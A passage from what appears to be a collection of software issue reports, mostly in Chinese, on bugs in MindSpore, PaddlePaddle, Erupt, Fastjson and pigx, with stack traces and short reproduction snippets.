~[spring-core-5.3.6.jar:5.3.6] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:779) ~[spring-aop-5.3.6.jar:5.3.6] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-5.3.6.jar:5.3.6] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:750) ~[spring-aop-5.3.6.jar:5.3.6] at org.springframework.dao.support.PersistenceExceptionTranslationInterceptor.invoke(PersistenceExceptionTranslationInterceptor.java:137) ~[spring-tx-5.3.6.jar:5.3.6] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.3.6.jar:5.3.6] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:750) ~[spring-aop-5.3.6.jar:5.3.6] at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:692) ~[spring-aop-5.3.6.jar:5.3.6] at xyz.erupt.jpa.dao.EruptJpaDao$$EnhancerBySpringCGLIB$$3806f361.queryEruptList() ~[erupt-jpa-1.7.3.jar:na] at xyz.erupt.jpa.service.EruptDataServiceDbImpl.queryList(EruptDataServiceDbImpl.java:60) ~[erupt-jpa-1.7.3.jar:na] at xyz.erupt.jpa.service.EruptDataServiceDbImpl$$FastClassBySpringCGLIB$$d4bad7a0.invoke() ~[erupt-jpa-1.7.3.jar:na] at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) ~[spring-core-5.3.6.jar:5.3.6] at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:688) ~[spring-aop-5.3.6.jar:5.3.6] at xyz.erupt.jpa.service.EruptDataServiceDbImpl$$EnhancerBySpringCGLIB$$be3bf0db.queryList() ~[erupt-jpa-1.7.3.jar:na] at xyz.erupt.core.service.EruptService.getEruptData(EruptService.java:70) ~[erupt-core-1.7.3.jar:na] at xyz.erupt.core.controller.EruptDataController.getEruptData(EruptDataController.java:65) ~[erupt-core-1.7.3.jar:na] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_121] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_121] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_121] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_121] at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:197) ~[spring-web-5.3.6.jar:5.3.6] at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:141) ~[spring-web-5.3.6.jar:5.3.6] at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:106) ~[spring-webmvc-5.3.6.jar:5.3.6] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:894) ~[spring-webmvc-5.3.6.jar:5.3.6] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808) ~[spring-webmvc-5.3.6.jar:5.3.6] at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-5.3.6.jar:5.3.6] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1060) ~[spring-webmvc-5.3.6.jar:5.3.6] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:962) ~[spring-webmvc-5.3.6.jar:5.3.6] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) ~[spring-webmvc-5.3.6.jar:5.3.6] at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) ~[spring-webmvc-5.3.6.jar:5.3.6] at javax.servlet.http.HttpServlet.service(HttpServlet.java:652) ~[tomcat-embed-core-9.0.45.jar:4.0.FR] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) ~[spring-webmvc-5.3.6.jar:5.3.6] at javax.servlet.http.HttpServlet.service(HttpServlet.java:733) ~[tomcat-embed-core-9.0.45.jar:4.0.FR] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:227) ~[tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) ~[tomcat-embed-websocket-9.0.45.jar:9.0.45] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar:9.0.45] at xyz.erupt.security.interceptor.HttpServletRequestFilter.doFilter(HttpServletRequestFilter.java:43) ~[erupt-security-1.7.3.jar:na] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar:9.0.45] at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-5.3.6.jar:5.3.6] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.6.jar:5.3.6] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar:9.0.45] at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-5.3.6.jar:5.3.6] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.6.jar:5.3.6] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar:9.0.45] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-5.3.6.jar:5.3.6] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.6.jar:5.3.6] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) ~[tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) [tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) [tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143) [tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) [tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) [tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:357) [tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) [tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar:9.0.45] at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar:9.0.45] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) [na:1.8.0_121] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) [na:1.8.0_121] at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar:9.0.45] at java.lang.Thread.run(Thread.java:745) [na:1.8.0_121]   <code>: @Erupt( name = ""Tree"", tree = @Tree(id = ""id"",label=""unitName"",pid = ""parent.id"") )"
[CT][MS][tanh]atanh op error on cpu&gpu pynative when dtype=complex,"atanh 算子复数原本应该不支持反向，反向调用pow算子应该抛异常 现在cpu上未抛异常，直接可以计算，ascend上报错 Sync stream failed:Ascend_0 / 硬件环境: ascend/cpu /device ascend/CPU : -- MindSpore version :alpha -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): pynative /mode pynative test_p_atanh_input_0d_dtype_complex64 test_p_atanh_input_1d_dtype_complex128 test_p_atanh_input_2d_dtype_complex64 test_p_atanh_input_3d_dtype_complex128 test_p_atanh_input_4d_dtype_complex128 test_p_atanh_input_5d_dtype_complex64 test_p_atanh_input_6d_dtype_complex64 test_p_atanh_input_7d_dtype_complex128 pytest -s -v operations/test_atanh.py case pass ascend: cpu   <code>: def test_p_atanh_input_0d_dtype_complex64(): x_real = np.random.randn() x_imag = np.random.randn() x = Tensor((x_real + 1j * x_imag), dtype=mstype.complex64) fact = AtanhMock(inputs=[x]) fact.forward_cmp() with pytest.raises(TypeError): &gt; fact.grad_cmp() ../operations/test_atanh.py:215: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/atanh_ops.py:88: in grad_cmp intput_x_grad_mindspore = self.grad_mindspore_impl() ../share/ops/primitive/atanh_ops.py:58: in grad_mindspore_impl grad_out = grad_net(intput_x_me, Tensor(self.output_grad_np)) /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:651: in __call__ raise err /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:647: in __call__ output = self._run_construct(args, kwargs) /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:413: in _run_construct output = self.construct(*cast_inputs, **kwargs) ../share/grad.py:27: in construct return self.grad(self.network)(*inputs) /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/ops/composite/base.py:378: in after_grad return grad_(fn)(*args, **kwargs) /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/common/api.py:97: in wrapper results = fn(*arg, **kwargs) /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/ops/composite/base.py:368: in after_grad out = _pynative_executor() _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._PyNativeExecutor object at 0xffff87826150&gt; def __call__(self): """""" PyNative executor run grad graph. Return: The return object after running grad graph. """""" &gt; return self._executor() E RuntimeError: Sync stream failed:Ascend_0 E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/runtime/graph_scheduler/graph_scheduler.cc:634 Run /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/common/api.py:950: RuntimeError def test_p_atanh_input_0d_dtype_complex64(): x_real = np.random.randn() x_imag = np.random.randn() x = Tensor((x_real + 1j * x_imag), dtype=mstype.complex64) fact = AtanhMock(inputs=[x]) fact.forward_cmp() with pytest.raises(TypeError): &gt; fact.grad_cmp() ../operations/test_atanh.py:215: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/atanh_ops.py:89: in grad_cmp allclose_nparray(intput_x_grad_mindspore, intput_x_grad_tf, self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array(0.13046062-0.4011502j, dtype=complex64) data_me = (0.27459747-0.32021502j), rtol = 2e-06, atol = 2e-06 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[0.13046062-0.4011502j] E data_me_error:[0.27459747-0.32021502j] E loss:[0.16530557]"
FileWriter设置schema时，shape设置支持list，但不支持tuple,"如题，FileWriter设置schema是，shape可以指定list，但无法指定tuple类型，不太符合python duck type的习惯。 报错内容为 Schema format is error. Detail: Field 'data' contain illegal attribute '(50, 1)' 建议可以改成支持tuple。 mindspore中Tensor的shape为Tuple类型，如此指定schema时可以直接复用Tensor的shape了。   <code>: import sys import numpy as np from mindspore import Tensor import scipy.io as scio from mindspore.mindrecord import FileWriter if __name__ == ""__main__"": schema_json = { ""data"" : {""type"":""float32"", ""shape"":(50, 1)}, } writer = FileWriter(file_name=""test.mindrecord"") writer.add_schema(schema_json, ""test_schema"")"
关于后台return list<map>里包含Long的类型的数据的时候报错,"因为前台jquery的ajax请求后对于返回的json比如id:1L,这种数据转换的时候是报错的 无法识别 目前我的做法是在FastjsonConfig类中 不知道这里是否有更好的方式   <code>: ValueFilter valueFilter = new ValueFilter() { public Object process(Object o, String s, Object o1) { if (null == o1) { o1 = """"; } **if(o1.getClass() == Long.class){ o1 = String.valueOf(o1); }** return o1; } };"
微信公众号服务URL配置失败，后台服务不响应,"pigx版本: 3.1 操作系统:win10 是否修改包名: no {""code"":1,""msg"":""Full authentication is required to access this resource"",""data"":""Full authentication is required to access this resource""}   <code>: 1、直接访问/mp/{appId}/portal接口后台服务无响应，debug也不报错 2、网络透传自测没有问题 3、透传访问接口也没有相应"
[bug]InsertGradientOf use a member function.,": /device gpu /device cpu On all device. : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : Compile fail, when use attr of is a class method like . Compile success.   <code>: fn P.InsertGradientOf self.save_gradient class Mul(nn.Cell): def __init__(self): super(Mul, self).__init__() self.get_g = P.InsertGradientOf(self.save_gradient) self.matrix_w = mindspore.Parameter(Tensor(np.ones([2, 2], np.float32)), name=""matrix_w"") self.matrix_g = mindspore.Parameter(Tensor(np.ones([2, 2], np.float32)), name=""matrix_g"") def save_gradient(self, dout): self.matrix_g = dout return dout def construct(self, x, y): z = x * self.matrix_w z = self.get_g(z) z = z * y return z"
请问huber_regression_cost支持weight加权吗？如果不支持的话，有什么办法可以像mse_cost一样对样本进行加权吗？,Check out this page to find out much more about markdown.   <code>: how do you run your code? what system do you use? Are you using GPU or not?
模型加载出错,"我按照官方的图像分类教程学习使用paddlepaddle，模型训练没有问题，但是应用模型出现了如下问题： <em>ValueError: cannot reshape array of size 294912 into shape ()</em> 代码如下：   <code>: from PIL import Image import paddle.v2 as paddle import numpy as np import os import gzip def load_image(file): im = Image.open(file) im = im.resize((32, 32), Image.ANTIALIAS) im = np.array(im).astype(np.float32) im = im.transpose((2, 0, 1)) # CHW im = im[(2, 1, 0),:,:] # BGR im = im.flatten() im = im / 255.0 return im test_data = [] cur_dir = os.path.dirname(os.path.realpath(__file__)) test_data.append(load_image(cur_dir + '/image/dog.png')) with gzip.open('params_pass_50.tar.gz', 'r') as f: parameters = paddle.parameters.Parameters.from_tar(f) probs = paddle.infer(output_layer=out, parameters=parameters, input=test_data) lab = np.argsort(-probs) # probs and lab are the results of one batch data print ""Label of image/dog.png is: %d"" % lab[0][0]"
"[ST][MS][NET][pangu MOE+pipline+alltoall][910 32p]IndexError: Array index out of range. Array size: 1, got index 3","pangu MOE+pipline+alltoall网络在910 32p训练失败 / 硬件环境: /device ascend : -- MindSpore version :r1.8 commit_id:9a7621d71 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C81/20220702 MindSpore 版本：编译时间20220721152651 r1.7.1 commit_id:9a7621d71 (/): /mode graph test_ms_pangu_moe_pipline_alltoall_train_check_loss_910_32p_0001.py cd solution_test/remaining/test_scripts/mindspore/net/pangu_alpha/network python -m nose -s --nologcapture test_ms_pangu_moe_pipline_alltoall_train_check_loss_910_32p_0001.py 网络训练成功 走给黄信静   <code>: [CRITICAL] KERNEL(114632,ffff928d2480,python):2022-07-22-12:14:17.497.334 [mindspore/ccsrc/plugin/device/ascend/kernel/tbe/tbe_kernel_compile.cc:471] QueryProcess] Single op compile failed, op: adam_apply_one_15422316462649664714_0 except_msg: 2022-07-22 12:14:17.410696: Query except_msg:Traceback (most recent call last): File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/te_fusion/parallel_compilation.py"", line 1467, in run extra_params=self._extra_params) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/te_fusion/fusion_manager.py"", line 1272, in build_single_op compile_info = call_op() File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/te_fusion/fusion_manager.py"", line 1259, in call_op opfunc(*inputs, *outputs, *new_attrs, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/tbe/common/utils/para_check.py"", line 547, in _in_wrapper return func(*args, **kwargs) File ""/usr/local/Ascend/latest/opp/op_impl/built-in/ai_core/tbe/impl/adam_apply_one.py"", line 285, in adam_apply_one sch = tbe.auto_schedule(res) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/te/lang/cce/api.py"", line 1271, in auto_schedule return tbe.dsl.auto_schedule(outs, option) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/tbe/dsl/api.py"", line 1052, in auto_schedule return tbe_auto_schedule.auto_schedule(outs, option) File ""&lt;decorator-gen-185&gt;"", line 2, in auto_schedule File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/tbe/tvm/target.py"", line 383, in dispatch_func return dispatch_dict[k](*args, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/tbe/dsl/unify_schedule/auto_schedule.py"", line 55, in _schedule_cce return static.schedule_cce(outs, option) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/tbe/dsl/static_schedule/cce_schedule.py"", line 438, in schedule_cce op_info=op_info) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/tbe/dsl/static_schedule/cce_schedule.py"", line 1091, in global_core_schedule spec_mid_list) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/tbe/dsl/static_schedule/elewise_multi_schedule.py"", line 96, in do_schedule self._calculate_emit_insn() File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/tbe/dsl/static_schedule/elewise_multi_schedule.py"", line 221, in _calculate_emit_insn ElewiseSchedule._calculate_emit_insn(self) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/tbe/dsl/static_schedule/elewise_schedule_new.py"", line 1543, in _calculate_emit_insn para = {""scope"": read_buffer.op.axis[emit_insn_axis], File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/tbe/tvm/container.py"", line 45, in __getitem__ .format(len(self), i)) IndexError: Array index out of range. Array size: 1, got index 3 The function call stack: Corresponding code candidate: - In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/optim/adam.py(70)/ next_m = op_mul(beta1, m_fp32) + op_mul(op_cast(F.tuple_to_array((1.0,)), mstype.float32)/ - In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/optim/adam.py(73)/ next_v = op_mul(beta2, v_fp32) + op_mul(op_cast(F.tuple_to_array((1.0,)), mstype.float32)/ - In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/optim/adam.py(74)/ - beta2, op_square(gradient_fp32))/ - In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/optim/adam.py(76)/ update = next_m / (eps + op_sqrt(next_v))/ - In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/optim/adam.py(80)/ update_with_lr = op_mul(lr, update)/ - In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/optim/adam.py(81)/ next_param = param_fp32 - op_reshape(update_with_lr, op_shape(param_fp32))/ - In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/optim/adam.py(84)/ next_param = F.depend(next_param, F.assign(m, op_cast(next_m, F.dtype(m))))/ In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/optim/adam.py(84)/ next_param = F.depend(next_param, F.assign(m, op_cast(next_m, F.dtype(m))))/ - In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/optim/adam.py(85)/ next_param = F.depend(next_param, F.assign(v, op_cast(next_v, F.dtype(v))))/ In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/optim/adam.py(85)/ next_param = F.depend(next_param, F.assign(v, op_cast(next_v, F.dtype(v))))/ Traceback (most recent call last): File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/pangu_alpha/network/test_ms_pangu_moe_pipline_alltoall_train_check_loss_910_32p_0001/train.py"", line 523, in &lt;module&gt; run_train_pipeline(opt) File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/pangu_alpha/network/test_ms_pangu_moe_pipline_alltoall_train_check_loss_910_32p_0001/train.py"", line 511, in run_train_pipeline sink_size=callback_size, dataset_sink_mode=True) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 911, in train sink_size=sink_size) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 91, in wrapper func(self, *args, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 553, in _train self._train_dataset_sink_process(epoch, train_dataset, list_callback, cb_params, sink_size) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 633, in _train_dataset_sink_process outputs = train_network(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 586, in __call__ out = self.compile_and_run(*args) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 963, in compile_and_run self.compile(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 937, in compile _cell_graph_executor.compile(self, *inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 1006, in compile result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) RuntimeError: mindspore/ccsrc/plugin/device/ascend/kernel/tbe/tbe_kernel_compile.cc:471 QueryProcess] Single op compile failed, op: adam_apply_one_15422316462649664714_0 except_msg: 2022-07-22 12:14:17.410696: Query except_msg:Traceback (most recent call last): File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/te_fusion/parallel_compilation.py"", line 1467, in run extra_params=self._extra_params) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/te_fusion/fusion_manager.py"", line 1272, in build_single_op compile_info = call_op() File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/te_fusion/fusion_manager.py"", line 1259, in call_op opfunc(*inputs, *outputs, *new_attrs, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/tbe/common/utils/para_check.py"", line 547, in _in_wrapper return func(*args, **kwargs) File ""/usr/local/Ascend/latest/opp/op_impl/built-in/ai_core/tbe/impl/adam_apply_one.py"", line 285, in adam_apply_one sch = tbe.auto_schedule(res) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/te/lang/cce/api.py"", line 1271, in auto_schedule return tbe.dsl.auto_schedule(outs, option) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/tbe/dsl/api.py"", line 1052, in auto_schedule return tbe_auto_schedule.auto_schedule(outs, option) File ""&lt;decorator-gen-185&gt;"", line 2, in auto_schedule File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/tbe/tvm/target.py"", line 383, in dispatch_func return dispatch_dict[k](*args, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/tbe/dsl/unify_schedule/auto_schedule.py"", line 55, in _schedule_cce return static.schedule_cce(outs, option) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/tbe/dsl/static_schedule/cce_schedule.py"", line 438, in schedule_cce op_info=op_info) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/tbe/dsl/static_schedule/cce_schedule.py"", line 1091, in global_core_schedule spec_mid_list) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/tbe/dsl/static_schedule/elewise_multi_schedule.py"", line 96, in do_schedule self._calculate_emit_insn() File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/tbe/dsl/static_schedule/elewise_multi_schedule.py"", line 221, in _calculate_emit_insn ElewiseSchedule._calculate_emit_insn(self) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/tbe/dsl/static_schedule/elewise_schedule_new.py"", line 1543, in _calculate_emit_insn para = {""scope"": read_buffer.op.axis[emit_insn_axis], File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/tbe/tvm/container.py"", line 45, in __getitem__ .format(len(self), i)) IndexError: Array index out of range. Array size: 1, got index 3 The function call stack: Corresponding code candidate: - In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/optim/adam.py(70)/ next_m = op_mul(beta1, m_fp32) + op_mul(op_cast(F.tuple_to_array((1.0,)), mstype.float32)/ - In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/optim/adam.py(73)/ next_v = op_mul(beta2, v_fp32) + op_mul(op_cast(F.tuple_to_array((1.0,)), mstype.float32)/ - In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/optim/adam.py(74)/ - beta2, op_square(gradient_fp32))/ - In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/optim/adam.py(76)/ update = next_m / (eps + op_sqrt(next_v))/ - In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/optim/adam.py(80)/ update_with_lr = op_mul(lr, update)/ - In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/optim/adam.py(81)/ next_param = param_fp32 - op_reshape(update_with_lr, op_shape(param_fp32))/ - In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/optim/adam.py(84)/ next_param = F.depend(next_param, F.assign(m, op_cast(next_m, F.dtype(m))))/ In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/optim/adam.py(84)/ next_param = F.depend(next_param, F.assign(m, op_cast(next_m, F.dtype(m))))/ - In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/optim/adam.py(85)/ next_param = F.depend(next_param, F.assign(v, op_cast(next_v, F.dtype(v))))/ In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/optim/adam.py(85)/ next_param = F.depend(next_param, F.assign(v, op_cast(next_v, F.dtype(v))))/"
我现在的是最新版本，但是项目启动的时候好像定时任务出现了问题，有bug,"D:\configure\jdk1.8.0_181\bin\java.exe -XX:TieredStopAtLevel=1 -noverify -Dspring.output.ansi.enabled=always -Dcom.sun.management.jmxremote -Dspring.jmx.enabled=true -Dspring.liveBeansView.mbeanDomain -Dspring.application.admin.enabled=true ""-javaagent:D:\IntelliJ IDEA\IntelliJ IDEA 2019.2.3\lib\idea_rt.jar=53970:D:\IntelliJ IDEA\IntelliJ IDEA 2019.2.3\bin"" -Dfile.encoding=UTF-8 -classpath 